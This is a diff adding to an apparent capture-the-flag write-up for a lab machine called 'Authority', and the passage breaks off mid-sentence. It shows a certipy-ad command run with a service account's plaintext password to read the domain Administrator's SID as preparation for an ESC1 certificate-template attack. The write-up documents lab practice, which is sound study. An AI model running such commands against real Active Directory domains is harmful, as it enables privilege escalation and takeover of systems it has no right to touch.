@@ -499,5 +499,17 @@ Certificate Templates
 As seen from the output above this is vulnerable to ESC1
 
 ```python
+certipy-ad account -u 'svc_ldap@authority.htb' -p 'lDaP_1n_th3_cle4r!' -dc-ip '10.129.229.56' -user 'administrator' read
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
+[*] Reading attributes for 'Administrator':
+    cn                                  : Administrator
+    distinguishedName                   : CN=Administrator,CN=Users,DC=authority,DC=htb
+    name                                : Administrator
+    objectSid                           : S-1-5-21-622327497-3269355298-2248959698-500
+    sAMAccountName                      : Administrator
+    userAccountControl                  : 66048
+    whenCreated                         : 2022-08-09T22:53:10+00:00
+    whenChanged                         : 2026-03-24T00:10:21+00:00
 ```
+I needed the admins SID for the attack so here i am request 
